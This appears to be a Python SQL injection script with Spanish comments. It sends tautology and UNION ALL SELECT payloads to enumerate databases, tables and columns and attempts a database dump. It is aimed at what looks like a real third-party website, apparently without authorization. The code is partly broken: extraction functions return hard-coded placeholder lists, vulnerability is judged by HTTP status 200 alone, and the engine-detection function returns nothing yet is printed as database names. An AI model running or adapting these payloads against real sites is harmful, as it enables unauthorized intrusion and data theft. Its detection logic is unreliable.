import requests
from bs4 import BeautifulSoup
import re
# Función para realizar una prueba de inyección SQL
def realizar_prueba(url, parametro):
    # Prueba de inyección SQL de ejemplo
    payload = f"' OR 1=1-- "
    url_vulnerable = f"{url}?{parametro}={payload}"

    response = requests.get(url_vulnerable)

    # Aquí puedes agregar la lógica para analizar la respuesta y determinar si la inyección fue exitosa
    # Puedes utilizar diferentes técnicas de prueba como las mencionadas anteriormente

    if response.status_code == 200:
        print(f"La URL {url} es vulnerable a inyección SQL con el parámetro {parametro}.")

        # Obtener nombres de bases de datos
        nombres_bd = detectar_motor_bd(url)
        print("Nombres de bases de datos encontrados:",nombres_bd)
        # print(nombres_bd)

        # Obtener nombres de tablas de una base de datos específica
        nombre_bd = "nombre_base_datos"
        nombres_tablas = obtener_nombres_tablas(url, nombre_bd)
        print(f"Nombres de tablas en la base de datos {nombre_bd}:")
        print(nombres_tablas)

        # Obtener nombres de columnas de una tabla específica
        nombre_tabla = "nombre_tabla"
        nombres_columnas = obtener_nombres_columnas(url, nombre_bd, nombre_tabla)
        print(f"Nombres de columnas en la tabla {nombre_tabla}:")
        print(nombres_columnas)

        # Obtener el dump completo de la base de datos
        dump_completo = obtener_dump_base_datos(url, nombre_bd)
        print(f"Dump completo de la base de datos {nombre_bd}:")
        print(dump_completo)

    else:
        print(f"La URL {url} no es vulnerable a inyección SQL con el parámetro {parametro}.")


# Función para obtener los nombres de las bases de datos
def detectar_motor_bd(url):
    # Consulta SQL específica de cada motor de base de datos
    payloads = {
        "MySQL": "' OR 1=1 --",
        "PostgreSQL": "' OR 'a'='a",
        "Microsoft SQL Server": "' OR 1=1; --",
        "Oracle": "' OR 1=1",
    }

    for db, payload in payloads.items():
        # Construye la URL con el payload inyectado
        injected_url = url + "?id=" + payload

        # Realiza la solicitud HTTP a la URL inyectada
        response = requests.get(injected_url)

        # Comprueba si se han producido errores en la respuesta
        if "error" in response.text.lower():
            print("Error de inyección SQL detectado en la URL:", injected_url)
            print("Posible motor de base de datos:", db)

# Función para obtener los nombres de las tablas en una base de datos
def obtener_nombres_tablas(url, nombre_bd):
    # Realizar la consulta SQL para obtener los nombres de las tablas
    consulta = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{nombre_bd}'"
    payload = f"' UNION ALL SELECT NULL, ({consulta})-- "
    url_vulnerable = f"{url}?parametro={payload}"

    response = requests.get(url_vulnerable)

    # Aquí puedes agregar la lógica para analizar la respuesta y extraer los nombres de las tablas

    nombres_tablas = ["nombre_tabla1", "nombre_tabla2", "nombre_tabla3"]  # Ejemplo: nombres de tablas extraídos
    return nombres_tablas


# Función para obtener los nombres de las columnas en una tabla
def obtener_nombres_columnas(url, nombre_bd, nombre_tabla):
    # Realizar la consulta SQL para obtener los nombres de las columnas
    consulta = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{nombre_bd}' AND table_name='{nombre_tabla}'"
    payload = f"' UNION ALL SELECT NULL, ({consulta})-- "
    url_vulnerable = f"{url}?parametro={payload}"

    response = requests.get(url_vulnerable)

    # Aquí puedes agregar la lógica para analizar la respuesta y extraer los nombres de las columnas

    nombres_columnas = ["nombre_columna1", "nombre_columna2", "nombre_columna3"]  # Ejemplo: nombres de columnas extraídos
    return nombres_columnas


# Función para obtener el dump completo de una base de datos
def obtener_dump_base_datos(url, nombre_bd):
    # Realizar la consulta SQL para obtener el dump completo
    consulta = "SELECT * FROM information_schema.tables"
    payload = f"' UNION ALL SELECT NULL, ({consulta})-- "
    url_vulnerable = f"{url}?parametro={payload}"

    response = requests.get(url_vulnerable)

    # Aquí puedes agregar la lógica para analizar la respuesta y extraer el dump completo

    dump_completo = "Dump completo de la base de datos"  # Ejemplo: dump completo extraído
    return dump_completo


# URL de ejemplo y parámetro vulnerable
url = "https://guerreros.mx/"
parametro = "id"

# Realizar la prueba de inyección SQL
realizar_prueba(url, parametro)
